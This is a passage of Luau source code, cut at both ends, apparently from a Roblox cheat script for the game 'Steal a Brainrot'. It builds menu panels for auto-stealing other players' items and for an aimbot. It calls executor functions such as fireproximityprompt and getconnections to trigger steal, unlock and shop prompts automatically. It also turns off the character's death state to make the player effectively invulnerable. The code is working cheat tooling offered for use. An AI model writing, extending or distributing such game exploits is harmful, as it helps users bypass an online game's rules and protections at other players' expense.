					textLabel8.TextXAlignment = Enum.TextXAlignment.Left
					fn24(textLabel8)
					textLabel8.Parent = textButton2

					local function fn34(arg)
						local color2 = arg and Color3.fromRGB(255, 150, 150) or Color3.fromRGB(226, 226, 232)
						TweenService:Create(textButton2, tweenInfo, { BackgroundTransparency = arg and 0.05 or 0.2 }):Play()

						TweenService:Create(uiStroke2, tweenInfo, {
							Color = arg and Color3.fromRGB(255, 120, 120) or Color3.fromRGB(255, 255, 255),
							Transparency = arg and 0.25 or 0.78,
						}):Play()

						TweenService:Create(textLabel7, tweenInfo, { TextColor3 = color2 }):Play()
						TweenService:Create(textLabel8, tweenInfo, { TextColor3 = color2 }):Play()
					end

					textButton2.MouseEnter:Connect(function()
						fn34(true)
					end)

					textButton2.MouseLeave:Connect(function()
						fn34(false)
					end)

					fn3(textButton2, function()
						prompt2 = nil
						str4 = ""
						str3 = ""
						fn30()
					end)

					local frame9 = Instance.new("Frame")
					frame9.BackgroundTransparency = 1
					frame9.Position = UDim2.fromOffset(10, 40)
					frame9.Size = UDim2.new(1, -20, 0, (n17 + 4) * (n14 + 1))
					frame9.Parent = frame7
					local uiListLayout = Instance.new("UIListLayout")
					uiListLayout.FillDirection = Enum.FillDirection.Vertical
					uiListLayout.Padding = UDim.new(0, 4)
					uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
					uiListLayout.Parent = frame9
					frame4 = frame9
					frame5 = frame9
					local textLabel9 = Instance.new("TextLabel")
					textLabel9.BackgroundTransparency = 1
					textLabel9.LayoutOrder = 99
					textLabel9.Size = UDim2.new(1, 0, 0, 22)
					textLabel9.Text = ""
					textLabel9.TextColor3 = Color3.fromRGB(140, 140, 150)
					textLabel9.TextScaled = true
					textLabel9.Visible = false
					fn24(textLabel9)
					textLabel9.Parent = frame9
					textLabel4 = textLabel9
					table.clear(iMap)

					for idx = 1, n14 + 1 do
						iMap[idx] = fn31(idx)
					end
				end
			end

			local function fn33(arg, arg2, arg3, arg4, arg5)
				local modelKey = tostring(arg5) .. "|" .. arg4

				if not (arg.ModelKey == modelKey and arg.Clone and arg.Clone.Parent) then
					for _, child in ipairs(arg.Viewport:GetChildren()) do
						if not child:IsA("Camera") then
							child:Destroy()
						end
					end

					arg.Clone = nil
					arg.Track = nil
					arg.SourceTrack = nil
					if arg4 == "" then
						arg.ModelKey = modelKey
						return
					end
					local v3 = fn28(arg2, arg3, arg4)

					if v3 then
						arg.ModelKey = modelKey

						local ok, clone = pcall(function()
							return v3:Clone()
						end)

						if not (not ok or not clone) then
							for _, descendant in ipairs(clone:GetDescendants()) do
								if descendant:IsA("ParticleEmitter") or descendant:IsA("Beam") or descendant:IsA("Trail") or descendant:IsA("Light") or descendant:IsA("Sound") or descendant:IsA("Script") or descendant:IsA("LocalScript") then
									descendant:Destroy()
								end
							end

							local worldModel = Instance.new("WorldModel")
							worldModel.Parent = arg.Viewport
							clone.Parent = worldModel

							pcall(function()
								clone:PivotTo(CFrame.new())
							end)

							local ok2, result, vector = pcall(function()
								return clone:GetBoundingBox()
							end)

							local vector2 = ok2 and vector
							local n24 = 4

							if vector2 then
								n24 = math.max(vector.X, vector.Y, vector.Z)
							end

							local n25 = math.max(n24 * 1.05, 3)
							ok2 = ok2 and result.Position or Vector3.zero
							arg.Camera.CFrame = CFrame.lookAt(ok2 + Vector3.new(n25 * 0.28, n25 * 0.08, -n25), ok2, Vector3.new(0, 1, 0))
							arg.Clone = clone
							local humanoid = v3:FindFirstChildWhichIsA("Humanoid") or v3:FindFirstChildWhichIsA("AnimationController")
							humanoid = humanoid and humanoid:FindFirstChildOfClass("Animator")
							local humanoid2 = clone:FindFirstChildWhichIsA("Humanoid") or clone:FindFirstChildWhichIsA("AnimationController")
							humanoid2 = humanoid2 and humanoid2:FindFirstChildOfClass("Animator")

							if humanoid and humanoid2 then
								local playingAnimationTracks = humanoid:GetPlayingAnimationTracks()
								playingAnimationTracks = playingAnimationTracks and playingAnimationTracks[1]

								if not (not playingAnimationTracks or not playingAnimationTracks.Animation) then
									local animation = Instance.new("Animation")
									animation.AnimationId = playingAnimationTracks.Animation.AnimationId

									local ok3, track = pcall(function()
										return humanoid2:LoadAnimation(animation)
									end)

									if ok3 and track then
										pcall(function()
											track.Looped = true
											track:Play(0)
											track.TimePosition = playingAnimationTracks.TimePosition
											track:AdjustSpeed(playingAnimationTracks.Speed)
										end)

										arg.Track = track
										arg.SourceTrack = playingAnimationTracks
									end
								end
							end

							return
						end
					end

					arg.ModelKey = nil
					return
				end
			end

			local function fn34()
				for _, v3 in ipairs(iMap) do
					local track = v3.Track
					local sourceTrack = v3.SourceTrack

					if track and sourceTrack and v3.Row.Visible and not pcall(function()
						if not track.IsPlaying then
							track:Play(0)
						end

						if math.abs(track.TimePosition - sourceTrack.TimePosition) > 0.2 then
							track.TimePosition = sourceTrack.TimePosition
						end
					end) then
						v3.Track = nil
						v3.SourceTrack = nil
					end
				end
			end

			local function fn35(arg, arg2)
				for _, child in ipairs(arg.TraitHolder:GetChildren()) do
					if child:IsA("ImageLabel") then
						child:Destroy()
					end
				end

				arg2 = arg2 and arg2:FindFirstChild("Traits")

				if arg2 then
					local layoutOrder = 0

					for _, child in ipairs(arg2:GetChildren()) do
						if child:IsA("ImageLabel") and child.Visible and child.Image ~= "" and layoutOrder < 3 then
							layoutOrder += 1
							local imageLabel = Instance.new("ImageLabel")
							imageLabel.BackgroundTransparency = 1
							imageLabel.Image = child.Image
							imageLabel.LayoutOrder = layoutOrder
							imageLabel.Size = UDim2.fromOffset(12, 12)
							imageLabel.Parent = arg.TraitHolder
						end
					end
				end
			end

			local function fn36()
				if not flag10 then
					if screenGui then
						destroyAll2()
					end
				else
					local now = os.clock()

					if not (now - n21 < n15) then
						n21 = now
						local character_ = localPlayer.Character
						character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
						if not character_ then
							destroyAll2()
							return
						end
						fn32()
						fn6(false)
						local magnitude = nil
						local plot3 = nil

						for _, v3 in ipairs(tbl3) do
							if v3.Prompt.Parent then
								local magnitude2 = (character_.Position - v3.Spawn.Position).Magnitude

								if magnitude2 <= n13 and (not magnitude or magnitude2 < magnitude) then
									plot3 = v3.Plot
									magnitude = magnitude2
								end
							end
						end

						if plot3 then
							plot = plot3
							n22 = now
						elseif plot and plot.Parent and now - n22 < 3 then
							plot3 = plot
						end

						local list = {}

						if plot3 then
							for _, v3 in ipairs(tbl3) do
								local prompt3 = v3.Prompt
								local parent = v3.Plot == plot3 and prompt3.Parent

								if parent then
									parent = tostring(prompt3.ObjectText or "") ~= ""
								end

								if parent then
									list[#list + 1] = {
										Podium = v3,
										Distance = (character_.Position - v3.Spawn.Position).Magnitude,
										Generation = v3.Generation or 0,
									}
								end
							end
						end

						local v3 = nil

						for _, v4 in ipairs(list) do
							if not v3 or v4.Distance < v3.Distance then
								v3 = v4
							end
						end

						table.sort(list, function(arg, arg2)
							return arg.Generation > arg2.Generation
						end)

						local list2 = {}

						if v3 then
							list2[#list2 + 1] = { Data = v3, Rank = 0 }
						end

						for idx = 1, math.min(n19, #list) do
							list2[#list2 + 1] = { Data = list[idx], Rank = idx }
						end

						local str5 = tostring(prompt2)

						for _, v4 in ipairs(list2) do
							str5 ..= "|" .. tostring(v4.Data.Podium.Prompt) .. ":" .. tostring(v4.Rank)
						end

						local flag11 = str5 ~= str3
						str3 = str5

						if textLabel3 then
							textLabel3.Text = plot3 and string.format("%d brainrot here", #list) or "walk into a base"
						end

						n23 = #list2
						plot2 = plot3
						fn26()

						if not flag9 then
							for idx, v4 in ipairs(iMap) do
								local v5 = list2[idx]

								if not v5 then
									v4.Row.Visible = false
									v4.Prompt = nil
									v4.RowKey = nil
									v4.Clone = nil
									v4.Track = nil
									v4.SourceTrack = nil
								else
									local podium = v5.Data.Podium
									local text = tostring(podium.Prompt.ObjectText or "")
									v4.Row.Visible = true
									v4.Prompt = podium.Prompt
									v4.RowKey = tostring(podium.Prompt) .. ":" .. tostring(v5.Rank)

									if v5.Rank == 0 then
										v4.Rank.Text = "NEAR"
										v4.Rank.TextColor3 = Color3.fromRGB(125, 205, 255)
									else
										v4.Rank.Text = "#" .. v5.Rank
										v4.Rank.TextColor3 = Color3.fromRGB(255, 214, 84)
									end

									v4.NameLabel.Text = text
									chilliGithubFastManualDefaultsRu.ApplyBrainrotNameStyle(v4.NameStyle, v5.Data.Generation)
									v4.ValueLabel.Text = fn5(v5.Data.Generation)

									if flag11 then
										local v6 = fn27(podium.Spawn, text)
										local mutation = v6 and v6:FindFirstChild("Mutation")

										if mutation and mutation:IsA("TextLabel") and mutation.Visible and tostring(mutation.Text) ~= "" then
											v4.MutationLabel.Text = mutation.Text
											v4.MutationLabel.TextColor3 = mutation.TextColor3
											v4.MutationLabel.RichText = mutation.RichText
										else
											v4.MutationLabel.Text = ""
										end

										fn35(v4, v6)
									end

									fn33(v4, podium.Plot, podium.Spawn, text, podium.Prompt)
								end
							end

							fn30()
							return
						end
					end
				end
			end

			fn2(RunService.Heartbeat:Connect(function()
				if flag2 then
					fn36()
				end
			end))

			local n24 = 0

			fn2(RunService.Heartbeat:Connect(function()
				if flag2 and flag10 and screenGui then
					local now = os.clock()

					if not (now < n24) then
						n24 = now + 0.25
						fn34()
						return
					end
				end
			end))

			autoStealBrainrotSection:CreateToggle({
				Name = "Show Auto Steal Bar",
				Note = "Shows the current Auto Steal target and hold progress.",
				Default = true,
				Quick = false,
				SubOf = autoStealToggle,
				Callback = function(arg)
					flag5 = arg == true
					fn21()
				end,
			})

			autoStealBrainrotSection:CreateToggle({
				Name = "Show Distance Meter",
				Note = "Adds a live distance row to the bar, measured against Auto Steal Distance.",
				Default = false,
				Quick = false,
				SubOf = autoStealToggle,
				Callback = function(arg)
					fn19(arg == true)
				end,
			})

			autoStealBrainrotSection:CreateSlider({
				Name = "Base Panel Size",
				Note = "Scales the Base Target Panel.",
				Min = 60,
				Max = 160,
				Default = 85,
				AllowDecimals = false,
				Increment = 1,
				Unit = "%",
				Quick = false,
				Callback = function(arg)
					n20 = math.clamp((tonumber(arg) or 100) / 100, 0.6, 1.6)

					if clampValue then
						clampValue()
					end
				end,
			})

			local baseTargetPanelToggle = autoStealBrainrotSection:CreateToggle({
				Name = "Base Target Panel",
				Note = "Lists the nearest and highest Brainrots in this base; pick one to take it first.",
				Default = true,
				Quick = false,
				Callback = function(arg)
					flag10 = arg == true

					if not flag10 then
						destroyAll2()
					end
				end,
			})

			autoStealBrainrotSection:CreateDropdown({
				Name = "Base Target Count",
				Options = { "1", "2", "3", "4", "5" },
				Default = "3",
				Quick = false,
				SubOf = baseTargetPanelToggle,
				Callback = function(arg)
					local n25 = math.clamp(math.floor(tonumber(arg) or 5), 1, 5)

					if n19 ~= n25 then
						n19 = n25
						str3 = ""
						n21 = -math.huge

						if flag10 then
							fn36()
						end
					end
				end,
			})

			autoStealBrainrotSection:CreateButton({
				Name = "Pick Nearest Target",
				ButtonText = "Pick",
				Note = "Targets the closest Brainrot; bind a key to it for one-press picking.",
				Quick = false,
				SubOf = baseTargetPanelToggle,
				Callback = function()
					local character_ = localPlayer.Character
					character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

					if character_ then
						fn6(false)
						local magnitude = nil
						local v3 = nil

						for _, v4 in ipairs(tbl3) do
							local prompt3 = v4.Prompt
							local parent = prompt3.Parent

							if parent then
								parent = tostring(prompt3.ObjectText or "") ~= ""
							end

							if parent then
								local magnitude2 = (character_.Position - v4.Spawn.Position).Magnitude

								if not magnitude or magnitude2 < magnitude then
									magnitude = magnitude2
									v3 = v4
								end
							end
						end

						if v3 then
							prompt2 = v3.Prompt
							str4 = tostring(v3.Prompt.ObjectText or "")
							fn22()
							str3 = ""
							fn30()
							return
						end
					end
				end,
			})

			autoStealBrainrotSection:CreateButton({
				Name = "Clear Picked Target",
				ButtonText = "Clear",
				Note = "Drops the picked Brainrot and returns to Nearest or Highest.",
				Quick = false,
				SubOf = baseTargetPanelToggle,
				Callback = function()
					prompt2 = nil
					str4 = ""
					str3 = ""
					fn30()
				end,
			})
		end

		do
			local n22 = 0.05
			local n23 = 22
			local n24 = 9
			local v = nil
			local n25 = -math.huge
			local n26 = 0
			local flag11 = false
			local flag112 = nil

			fn2(RunService.RenderStepped:Connect(function(deltaTime)
				if flag2 and flag3 then
					fn18(deltaTime)
				elseif part then
					destroyAll()
				end

				if not flag2 or not flag3 or not flag5 then
					v = nil
					return
				end
				local now = os.clock()

				if now - n25 >= n22 then
					n25 = now
					local str4, str5, generation

					if flag7 or localPlayer:GetAttribute("Stealing") == true then
						n26 = 0
						str4 = "GET READY - carrying brainrot"
						str5 = ""
						generation = nil
					else
						local character_ = localPlayer.Character
						character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

						if character_ then
							local v2, v3

							if flag4 then
								local v4, v5, v6
								v4, v5, v2, v6, v3 = fn15(character_)
							else
								local v4, v5, v6, v7
								v4, v5, v6, v7, v3 = fn15(character_)
								v2 = fn8(character_) or v5 or v7
							end

							if v2 then
								str4 = v2.Name
								str5 = fn5(v2.Generation)
								generation = v2.Generation
								local n27 = math.max(tonumber(n3), 1)
								n26 = 1 - math.clamp(v2.Distance / n27, 0, 1)

								if visible then
									str4 = string.format("%s   %.0f/%d", v2.Name, v2.Distance, n27)
								end

								local n28 = 10

								pcall(function()
									n28 = v2.Prompt.MaxActivationDistance
								end)

								flag11 = v2.Distance <= n28
							else
								str4 = v3 == 0 and "no steal prompts" or ""
								n26 = 0
								flag11 = false
								str5 = ""
								generation = nil
							end
						else
							n26 = 0
							flag11 = false
							str4 = ""
							str5 = ""
							generation = nil
						end
					end

					local str6 = tostring(str4) .. "\0" .. tostring(str5)

					if str6 ~= v then
						v = str6
						fn20(str4, str5, generation)
					end
				end

				if flag8 and localPlayer:GetAttribute("Stealing") == true then
					flag8 = false
				end

				local n27 = 0

				if flag8 then
					n27 = math.clamp((now - n8) / n9, 0, 1)
				end

				local n28 = math.min(deltaTime or 0.016, 0.1)
				n10 += (n27 - n10) * (1 - math.exp(-n28 * n23))

				if n27 <= 0 and n10 < 0.002 then
					n10 = 0
				end

				frame.Size = UDim2.new(n10, 0, 1, 0)

				if visible then
					n11 += (n26 - n11) * (1 - math.exp(-n28 * n24))
					frame2.Size = UDim2.new(n11, 0, 1, 0)

					if flag11 ~= flag112 then
						flag112 = flag11
						frame2.BackgroundTransparency = 0.62
					end
				end
			end))
		end

		local function fn24()
			if flag2 then
				flag2 = false
				flag3 = false
				flag7 = false
				n5 += 1
				fn17()
				disconnectAll()
				destroyAll()
				destroyAll2()
				fn23()

				if chilliAutoGetBarGui then
					pcall(function()
						chilliAutoGetBarGui:Destroy()
					end)
				end

				if chilliMacLibTargetGui then
					pcall(function()
						chilliMacLibTargetGui:Destroy()
					end)
				end
			end
		end

		cleanup.Event:Connect(fn24)
		chilliAutoGetRuntime.Destroying:Connect(fn24)

		do
			local flag11 = true
			local flag12 = false
			local n22 = 0
			local connection2 = nil
			local chilliDropBrainrotRuntime = CoreGui:FindFirstChild("__ChilliDropBrainrotRuntime")

			if chilliDropBrainrotRuntime then
				local cleanup2 = chilliDropBrainrotRuntime:FindFirstChild("Cleanup")

				if cleanup2 and cleanup2:IsA("BindableEvent") then
					pcall(function()
						cleanup2:Fire()
					end)
				end

				pcall(function()
					chilliDropBrainrotRuntime:Destroy()
				end)
			end

			local chilliDropBrainrotRuntime2 = Instance.new("Folder")
			chilliDropBrainrotRuntime2.Name = "__ChilliDropBrainrotRuntime"
			chilliDropBrainrotRuntime2.Archivable = false
			chilliDropBrainrotRuntime2.Parent = CoreGui
			local cleanup2 = Instance.new("BindableEvent")
			cleanup2.Name = "Cleanup"
			cleanup2.Parent = chilliDropBrainrotRuntime2

			local function fn25(arg)
				localPlayer:SetAttribute("ChilliDropBrainrotActive", arg == true)
			end

			local function fn26()
			end

			local function fn27()
				flag11 = false
				n22 += 1
				flag12 = false
				fn25(false)
				connection2:Disconnect()
				connection2 = nil
			end

			fn25(false)

			connection2 = localPlayer.CharacterAdded:Connect(function()
				n22 += 1
				flag12 = false
				fn25(false)
			end)

			cleanup2.Event:Connect(fn27)
			chilliDropBrainrotRuntime2.Destroying:Connect(fn27)
			autoStealBrainrotSection:CreateButton({ Name = "Drop Brainrot", ButtonText = "Drop", Callback = fn26 })
		end

		helperSection = helperTab:CreateSection({ Name = "Helper", Expanded = true })
		aimbotSection = helperTab:CreateSection({ Name = "Aimbot", Expanded = true })
		section = helperTab:CreateSection({ Name = "Movement & Combat", Expanded = true })
		local unlockBaseSection
		unlockBaseSection = helperTab:CreateSection({ Name = "Unlock Base", Expanded = true })
		local flag11
		flag11 = false
		local chilliUnlockBaseRuntime

		do
			local CoreGui2 = CoreGui

			pcall(function()
				if type(gethui) == "function" then
					local hui = gethui()

					if typeof(hui) == "Instance" then
						CoreGui2 = hui
					end
				end
			end)

			local chilliUnlockBaseRuntime2 = CoreGui2:FindFirstChild("__ChilliUnlockBaseRuntime")

			if chilliUnlockBaseRuntime2 then
				local cleanup2 = chilliUnlockBaseRuntime2:FindFirstChild("Cleanup")

				if cleanup2 and cleanup2:IsA("BindableEvent") then
					pcall(function()
						cleanup2:Fire()
					end)
				end

				pcall(function()
					chilliUnlockBaseRuntime2:Destroy()
				end)
			end

			chilliUnlockBaseRuntime = Instance.new("Folder")
			chilliUnlockBaseRuntime.Name = "__ChilliUnlockBaseRuntime"
			chilliUnlockBaseRuntime.Archivable = false
			chilliUnlockBaseRuntime.Parent = CoreGui2
		end

		do
			local cleanup2 = Instance.new("BindableEvent")
			cleanup2.Name = "Cleanup"
			cleanup2.Parent = chilliUnlockBaseRuntime

			local function fn25()
				local character_ = localPlayer.Character
				if not character_ then
					return nil
				end
				return character_:FindFirstChild("HumanoidRootPart") or character_:FindFirstChild("UpperTorso")
			end

			local function findFirstChild()
				return Workspace:FindFirstChild("Plots")
			end

			local function fn26(arg, arg2)
				local n22 = arg.X - arg2.X
				local n23 = arg.Z - arg2.Z
				return math.sqrt(n22 * n22 + n23 * n23)
			end

			local function fn27(arg, arg2)
				local animalPodiums = arg:FindFirstChild("AnimalPodiums")
				local huge = math.huge

				if animalPodiums then
					for _, child in ipairs(animalPodiums:GetChildren()) do
						local base = child:FindFirstChild("Base")
						base = base and base:FindFirstChild("Spawn")

						if base and base:IsA("BasePart") then
							huge = math.min(huge, fn26(arg2, base.Position))
						end
					end
				end

				if huge == math.huge then
					local ok, result = pcall(function()
						return arg:GetPivot()
					end)

					if ok then
						huge = fn26(arg2, result.Position)
					end
				end

				return huge
			end

			local function fn28()
				local v = fn25()
				local firstChild = findFirstChild()
				if not v or not firstChild then
					return nil
				end
				local huge = math.huge
				local child = nil

				for _, child2 in ipairs(firstChild:GetChildren()) do
					local v2 = fn27(child2, v.Position)

					if v2 < huge then
						huge = v2
						child = child2
					end
				end

				return child
			end

			local function fn29(arg)
				local firstChild = findFirstChild()

				while arg and arg ~= Workspace do
					if arg.Parent == firstChild then
						return arg
					end
					arg = arg.Parent
				end

				return nil
			end

			local function fn30(arg)
				arg = arg and arg:FindFirstChild("AnimalPodiums")
				local ys = {}
				if not arg then
					return ys
				end

				for _, child in ipairs(arg:GetChildren()) do
					local base = child:FindFirstChild("Base")
					base = base and base:FindFirstChild("Spawn")

					if base and base:IsA("BasePart") then
						local y = base.Position.Y
						local flag12 = false

						for _, v in ipairs(ys) do
							if math.abs(v - y) < 1 then
								flag12 = true
								break
							end
						end

						if not flag12 then
							ys[#ys + 1] = y
						end
					end
				end

				table.sort(ys)
				return ys
			end

			local function fn31(arg, arg2)
				local animalPodiums = arg2 and arg2:FindFirstChild("AnimalPodiums")

				while true do
					if arg and arg ~= arg2 then
						if arg.Parent == animalPodiums then
							break
						end
						arg = arg.Parent
						continue
					end

					return nil
				end

				local base = arg:FindFirstChild("Base")
				base = base and base:FindFirstChild("Spawn")
				if base and base:IsA("BasePart") then
					return base.Position.Y
				end
				return nil
			end

			local function fn32(arg, arg2)
				local v = fn30(arg2)
				local v2 = fn31(arg, arg2)

				if v2 and #v > 0 then
					local huge = math.huge
					local n22 = 1

					for idx, v3 in ipairs(v) do
						local n23 = math.abs(v2 - v3)

						if n23 < huge then
							huge = n23
							n22 = idx
						end
					end

					return math.clamp(n22, 1, 3)
				end

				local v3 = fn25()
				if not v3 or #v == 0 then
					return 1
				end
				local y = v[1]

				local ok, result = pcall(function()
					return arg2:GetPivot()
				end)

				if ok then
					y = result.Position.Y
				end

				local n22 = v[1] - y
				local n23 = 1

				for idx = 2, math.min(#v, 3) do
					if v[idx] - n22 <= v3.Position.Y then
						n23 = idx
					end
				end

				return n23
			end

			local function fn33(arg)
				arg = arg and arg:FindFirstChild("Unlock")
				local list = {}
				if not arg then
					return list
				end

				for _, child in ipairs(arg:GetChildren()) do
					local position

					if child:IsA("Model") then
						local ok, result = pcall(function()
							return child:GetPivot()
						end)

						position = nil

						if ok then
							position = result.Position
						end
					else
						position = nil

						if child:IsA("BasePart") then
							position = child.Position
						end
					end

					if position then
						list[#list + 1] = { Instance = child, Y = position.Y }
					end
				end

				table.sort(list, function(arg2, arg3)
					return arg2.Y < arg3.Y
				end)

				return list
			end

			local function triggerPrompt(arg, arg2)
				local v = fireproximityprompt

				if type(v) == "function" then
					local v2 = fn33(arg)[arg2]

					if v2 then
						local flag12 = false

						for _, descendant in ipairs(v2.Instance:GetDescendants()) do
							if descendant:IsA("ProximityPrompt") then
								flag12 = pcall(v, descendant) or flag12
							end
						end

						return flag12
					end
				end

				return false
			end

			local function fn34(arg)
				local v = fn28()

				if v then
					triggerPrompt(v, arg)
				end
			end

			local function fn35(arg)
				if not arg or not arg:IsA("ProximityPrompt") then
					return false
				end
				return string.find(string.lower(tostring(arg.ActionText or "")), "steal", 1, true) ~= nil
			end

			local connection2 = ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt3, player)
				if not (player and player ~= localPlayer or not fn35(prompt3)) then
					local v = fn29(prompt3) or fn28()

					if v then
						local v2 = fn32(prompt3, v)
						task.defer(triggerPrompt, v, v2)
						return
					end
				end
			end)

			local function fn36(arg)
				arg._quickBarDefault = 4
				return arg
			end

			fn36(unlockBaseSection:CreateToggle({
				Name = "Auto Unlock Base",
				Note = "Unlocks the current floor when you start stealing. Requires Robux.",
				Default = false,
				Pin = true,
				QuickBar = 4,
				Callback = function(arg)
					flag11 = arg == true
				end,
			}))

			fn36(unlockBaseSection:CreateButton({
				Name = "Unlock Floor 3",
				ButtonText = "Unlock",
				Note = "Unlocks Floor 3 of the nearest base. Requires Robux.",
				Pin = true,
				QuickBar = 4,
				Callback = function()
					fn34(3)
				end,
			}))

			fn36(unlockBaseSection:CreateButton({
				Name = "Unlock Floor 2",
				ButtonText = "Unlock",
				Note = "Unlocks Floor 2 of the nearest base. Requires Robux.",
				Pin = true,
				QuickBar = 4,
				Callback = function()
					fn34(2)
				end,
			}))

			fn36(unlockBaseSection:CreateButton({
				Name = "Unlock Floor 1",
				ButtonText = "Unlock",
				Note = "Unlocks Floor 1 of the nearest base. Requires Robux.",
				Pin = true,
				QuickBar = 4,
				Callback = function()
					fn34(1)
				end,
			}))

			local function fn37()
				flag11 = false
				connection2:Disconnect()
				connection2 = nil
			end

			cleanup2.Event:Connect(fn37)
			chilliUnlockBaseRuntime.Destroying:Connect(fn37)
		end
	end

	local chilliHelperLocalRuntime = CoreGui:FindFirstChild("__ChilliHelperLocalRuntime")

	if chilliHelperLocalRuntime then
		local cleanup = chilliHelperLocalRuntime:FindFirstChild("Cleanup")

		if cleanup and cleanup:IsA("BindableEvent") then
			pcall(function()
				cleanup:Fire()
			end)
		end

		pcall(function()
			chilliHelperLocalRuntime:Destroy()
		end)
	end

	do
		local chilliHelperLocalRuntime2 = Instance.new("Folder")
		chilliHelperLocalRuntime2.Name = "__ChilliHelperLocalRuntime"
		chilliHelperLocalRuntime2.Archivable = false
		chilliHelperLocalRuntime2.Parent = CoreGui
		local cleanup = Instance.new("BindableEvent")
		cleanup.Name = "Cleanup"
		cleanup.Parent = chilliHelperLocalRuntime2
		flag = true
		local list = {}

		fn = function(arg)
			list[#list + 1] = arg
		end

		local function fn2()
			if not flag then
				return
			end
			flag = false

			for _, v in ipairs(list) do
				pcall(v)
			end

			table.clear(list)
		end

		cleanup.Event:Connect(fn2)
		chilliHelperLocalRuntime2.Destroying:Connect(fn2)
	end

	do
		local function fn2()
			if localPlayer:GetAttribute("BlockTools") == true then
				localPlayer:SetAttribute("BlockTools", false)
			end
		end

		fn2()
		local connection = localPlayer:GetAttributeChangedSignal("BlockTools"):Connect(fn2)

		fn(function()
			if connection then
				connection:Disconnect()
				connection = nil
			end
		end)
	end

	tbl2 = { ProtectedHumanoid = nil, RescueSerial = 0 }

	do
		local n = 0.5
		local humanoid = nil
		local tbl3 = nil
		local connections = {}
		local n2 = 0

		local function disconnectAll()
			for _, connection in ipairs(connections) do
				if connection.Connected then
					connection:Disconnect()
				end
			end

			table.clear(connections)
		end

		local function fn2()
			disconnectAll()
			local humanoid2 = humanoid
			local tbl32 = tbl3
			humanoid = nil
			tbl3 = nil
			tbl2.ProtectedHumanoid = nil
			if not humanoid2.Parent or not tbl32 then
				return
			end

			pcall(function()
				humanoid2.BreakJointsOnDeath = tbl32.BreakJointsOnDeath
				humanoid2.RequiresNeck = tbl32.RequiresNeck
				humanoid2:SetStateEnabled(Enum.HumanoidStateType.Dead, tbl32.DeadStateEnabled)
			end)
		end

		local function fn3(arg)
			if not arg or not arg.Parent then
				return false
			end

			return pcall(function()
				arg.BreakJointsOnDeath = false
				arg.RequiresNeck = false
				arg:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
			end) and arg.BreakJointsOnDeath == false and arg.RequiresNeck == false and arg:GetStateEnabled(Enum.HumanoidStateType.Dead) == false
		end

		local function fn4(arg)
			if arg ~= humanoid or not arg or not arg.Parent then
			end

			return false
		end

		local function fn5(arg)
			fn2()

			if not (not flag or not arg or arg ~= localPlayer.Character) then
				local humanoid2 = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)

				if not (not flag or arg ~= localPlayer.Character or not humanoid2 or not humanoid2:IsA("Humanoid")) then
					humanoid = humanoid2
					tbl2.ProtectedHumanoid = humanoid2

					tbl3 = {
						BreakJointsOnDeath = humanoid2.BreakJointsOnDeath,
						RequiresNeck = humanoid2.RequiresNeck,
						DeadStateEnabled = humanoid2:GetStateEnabled(Enum.HumanoidStateType.Dead),
					}

					if not fn3(humanoid2) or not fn4(humanoid2) then
						fn2()
						return false
					end

					connections[#connections + 1] = humanoid2.HealthChanged:Connect(function()
						fn4(humanoid2)
					end)

					connections[#connections + 1] = humanoid2:GetPropertyChangedSignal("MaxHealth"):Connect(function()
						fn4(humanoid2)
					end)

					connections[#connections + 1] = humanoid2.StateChanged:Connect(function(old, new)
						if new == Enum.HumanoidStateType.Dead then
							fn3(humanoid2)
							fn4(humanoid2)
						end
					end)

					n2 = os.clock()
					return true
				end
			end

			return false
		end

		local connection = localPlayer.CharacterAdded:Connect(function(character_)
			fn5(character_)
		end)

		local connection2 = RunService.Heartbeat:Connect(function()
			local now = os.clock()

			if now - n2 >= n then
				n2 = now
				fn3(humanoid)
				fn4(humanoid)
			end
		end)

		task.spawn(function()
			fn5(localPlayer.Character)
		end)

		fn(function()
			fn2()
			connection:Disconnect()
			connection = nil
			connection2:Disconnect()
			connection2 = nil
		end)
	end

	local fn2, fn3
	local n = 2

	fn2 = function(arg)
		local character_ = localPlayer.Character
		local backpack = localPlayer:FindFirstChildOfClass("Backpack")
		return character_ and character_:FindFirstChild(arg) or backpack and backpack:FindFirstChild(arg)
	end

	fn3 = function(arg)
		local v = fn2(arg)
		if v then
			return v
		end
		local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
		playerGui = playerGui and playerGui:FindFirstChild("CoinsShop")
		playerGui = playerGui and playerGui:FindFirstChild("CoinsShop")
		playerGui = playerGui and playerGui:FindFirstChild("Content")
		playerGui = playerGui and playerGui:FindFirstChild("Items")
		playerGui = playerGui and playerGui:FindFirstChild(arg)
		local locked = playerGui and playerGui:FindFirstChild("Locked")
		playerGui = playerGui and playerGui:FindFirstChild("Buy")
		if locked and locked.Visible then
			return nil, "rebirth"
		end

		if playerGui then
			local ok, result = pcall(getconnections, playerGui.Activated)

			if not (not ok or type(result) ~= "table") then
				local flag2 = false

				for _, v2 in ipairs(result) do
					if v2.Enabled and type(v2.Fire) == "function" and pcall(function()
						v2:Fire()
					end) then
						flag2 = true
						break
					end
				end

				if flag2 then
					local now = os.clock()

					while true do
						local v2 = fn2(arg)

						if v2 then
							return v2
						else
							RunService.Heartbeat:Wait()
							if not (n <= os.clock() - now) then
								continue
							end
							break
						end
					end

					return fn2(arg), "cash"
				end
			end
		end

		return nil, "unavailable"
	end

	local fn4

	fn4 = function(arg, arg2)
		local str

		if arg2 == "rebirth" then
			str = "A higher Rebirth level is required for " .. arg .. "."
		elseif arg2 == "cash" then
			str = "Not enough cash to buy " .. arg .. "."
		else
			str = "Unable to buy " .. arg .. " right now."
		end

		uiLibrary.Notify("Tool unavailable", str, 5)
	end

	local fn5
	local n2 = 0

	runUntilTimeout = function(arg)
		local max = math.max
		local n22 = n2
		n2 = max(n22, os.clock() + (tonumber(arg) or 1))
	end

	fn5 = function()
		return os.clock() < n2
	end

	do
		local n3 = 0.02
		local n4 = 5
		local n5 = 7
		local n6 = 2
		local flag2 = false
		local flag3 = false
		local n7 = 0
		local connection = nil
		local connection2 = nil
		local connection3 = nil
		local position = nil
		local playerMap = {}
		local n8 = 0
		local n9 = 0
		local v = nil
		local fn6 = nil

		local function fn7(arg)
			if not arg then
				return nil
			end
			local character_ = arg.Character
